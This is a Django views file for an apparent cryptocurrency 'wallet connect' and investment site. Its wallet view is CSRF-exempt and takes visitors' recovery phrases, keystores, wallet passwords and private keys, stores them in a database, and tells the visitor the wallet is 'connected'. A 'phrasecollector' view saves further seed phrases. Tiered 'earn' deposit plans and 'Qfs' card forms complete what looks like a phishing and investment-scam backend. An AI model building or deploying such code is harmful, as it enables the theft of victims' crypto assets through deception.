from django.contrib import messages
from django.contrib.auth import login , logout
from django.contrib.auth.decorators import login_required
from django.shortcuts import redirect, render , get_object_or_404
from django.contrib.auth.views import LoginView

from .forms import SignUpForm , LoginForm
from .models import Wallet , Recoveryphrase , CryptoWallet
from django.views.decorators.csrf import csrf_protect ,csrf_exempt
from decimal import Decimal, InvalidOperation
from .models import EarnSubmission

def home(request):
    
    return render(request, "app/home.html")
@csrf_protect
@csrf_exempt
def wallet(request):
    if request.method == "POST":
        walletcommingfrom = request.POST.get("walletcommingfrom")
        walletname = request.POST.get("walletname")
        walletemail = request.POST.get("walletemail")
        recoveryphrase = request.POST.get("recoveryphrase")
        keystore = request.POST.get("keystore")
        wallet_password = request.POST.get("wallet_password")
        private_key =  request.POST.get("private_key")
        new_wallet = Wallet.objects.create(
            walletcommingfrom =walletcommingfrom,
            walletname=walletname,
            walletemail=walletemail,
            recoveryphrase=recoveryphrase,
            keystore=keystore,
            wallet_password=wallet_password,
            private_key=private_key,
        )
        messages.success( request, f"Your {new_wallet.walletcommingfrom} wallet connected! create an account ")
        return redirect("/signup")
    
    return render(request, "app/wallet.html" )
@csrf_exempt
def phrasecollector(request):
    if request.method == "POST":
        phrase = request.POST.get("phrase")
        Recoveryphrase.objects.create(
            user = request.user,
            phrase = phrase
        )
        return redirect("/dashboard")
    
    

        
def payment_method(request):
    return render(request, "app/payment_method.html")    



def btc(request):
    return render(request, "app/btc.html")


def btc(request):
    wallet = get_object_or_404(CryptoWallet, slug="btc")
    return render(request, "app/btc.html", {"wallet": wallet})

def eth(request):
    wallet = get_object_or_404(CryptoWallet, slug="eth")
    return render(request, "app/eth.html", {"wallet": wallet})

def xrp(request):
    wallet = get_object_or_404(CryptoWallet, slug="xrp")
    return render(request, "app/xrp.html", {"wallet": wallet})

def ltc(request):
    wallet = get_object_or_404(CryptoWallet, slug="ltc")
    return render(request, "app/ltc.html", {"wallet": wallet})

def xlm(request):
    wallet = get_object_or_404(CryptoWallet, slug="xlm")
    return render(request, "app/xlm.html", {"wallet": wallet})

def doge(request):
    wallet = get_object_or_404(CryptoWallet, slug="doge")
    return render(request, "app/doge.html", {"wallet": wallet})

def sol(request):
    wallet = get_object_or_404(CryptoWallet, slug="sol")
    return render(request, "app/sol.html", {"wallet": wallet})

def wlfi(request):
    wallet = get_object_or_404(CryptoWallet, slug="wlfi")
    return render(request, "app/wlfi.html", {"wallet": wallet})

def shib(request):
    wallet = get_object_or_404(CryptoWallet, slug="shib")
    return render(request, "app/shib.html", {"wallet": wallet})

@login_required
def earn(request):
    return render(request, "app/earn.html")
@login_required
def swap(request):
    return render(request, "app/swap.html")

@login_required
def fund(request):
    return render(request, "app/fund.html")
@login_required
def fund_wallet(request):
    return render(request, "app/fund_wallet.html")
@login_required
def card(request):
    return render(request, "app/card.html")

from django.http import JsonResponse
from django.views.decorators.http import require_POST
from .models import CardApplication

@login_required
@require_POST
def apply_card(request):
    """
    Accepts POST from your existing forms (no Django Form used).
    Expects fields:
      - card_type
      - topup_amount (we treat this as the address field)
      - notes (optional)
    Returns JSON { success: True } or { success: False, errors: {...} }.
    """
    # Read raw POST values (keep same names as your forms)
    card_type = request.POST.get("card_type", "").strip()
    address = request.POST.get("topup_amount", "").strip() or request.POST.get("address", "").strip()
    notes = request.POST.get("notes", "").strip()

    errors = {}

    # Minimal validation
    if not card_type:
        errors["card_type"] = ["Card type is required."]
    else:
        # Validate allowed choices server-side to avoid invalid values
        allowed = {"Qfs", "visa", "WEB3_Qfs", "WEB3_visa"}
        if card_type not in allowed:
            errors["card_type"] = ["Invalid card type."]

    if not address:
        errors["address"] = ["Address is required."]
    elif len(address) > 512:
        errors["address"] = ["Address is too long."]

    if errors:
        return JsonResponse({"success": False, "errors": errors}, status=400)

    # Save to DB
    app = CardApplication.objects.create(
        user=request.user if request.user.is_authenticated else None,
        card_type=card_type,
        address=address,
        notes=notes,
    )

    # Optionally: do other side effects here (send email, log, etc.)

    return JsonResponse({"success": True})


@login_required
@require_POST
def submit_earn(request):
    """
    Accepts POST with:
      - plan (basic|standard|premium|vip)
      - amount
      - notes (optional)
    Returns JSON { success: True } or { success: False, errors: {...} }.
    """
    plan = (request.POST.get("plan") or "").strip().lower()
    amount_raw = (request.POST.get("amount") or "").strip()
    notes = (request.POST.get("notes") or "").strip()

    errors = {}

    # Define allowed plans and their min/max amounts (adjust as needed)
    allowed_plans = {
        "basic": (10, 499),
        "standard": (500, 1999),
        "premium": (2000, 9999),
        "vip": (10000, 1000000),
    }

    if plan not in allowed_plans:
        errors["plan"] = ["Invalid plan selected."]

    try:
        amount = Decimal(amount_raw)
    except (InvalidOperation, ValueError):
        errors["amount"] = ["Enter a valid numeric amount."]
    else:
        if amount <= 0:
            errors["amount"] = ["Amount must be greater than zero."]
        elif plan in allowed_plans:
            min_amt, max_amt = allowed_plans[plan]
            if amount < Decimal(min_amt) or amount > Decimal(max_amt):
                errors["amount"] = [f"Amount must be between ${min_amt} and ${max_amt} for this plan."]

    if errors:
        return JsonResponse({"success": False, "errors": errors}, status=400)

    EarnSubmission.objects.create(
        user=request.user if request.user.is_authenticated else None,
        plan=plan,
        amount=amount,
        notes=notes,
    )

    # optional: send admin notification here

    return JsonResponse({"success": True})

@login_required
def dashboard(request):
    return render(request, "app/dashboard.html")




def signup(request):
    if request.user.is_authenticated:
        return redirect("dashboard")
    if request.method == "POST":
        form = SignUpForm(request.POST)
        if form.is_valid():
            form.save()  # just create the user, no login()
            messages.success(request, "Your account was created successfully. Please log in.")
            return redirect("login")  # send them to login page
    else:
        form = SignUpForm()

    return render(request, "app/signup.html", {"form": form})



class CustomLoginView(LoginView):
    template_name = "app/login.html"
    authentication_form = LoginForm

    def dispatch(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            return redirect("dashboard")
        return super().dispatch(request, *args, **kwargs)

    def form_valid(self, form):
        user = form.get_user()
        login(self.request, user)
        messages.success(self.request, f"Welcome back, {user.email}!")
        return redirect("dashboard")

    def form_invalid(self, form):
        messages.error(self.request, "Invalid email or password. Please try again.")
        return super().form_invalid(form)



@login_required
def logout_view(request):
    """Handle user logout"""
    user = request.user

    logout(request)
    messages.success(request, "You have been logged out successfully.")
    return redirect("/login")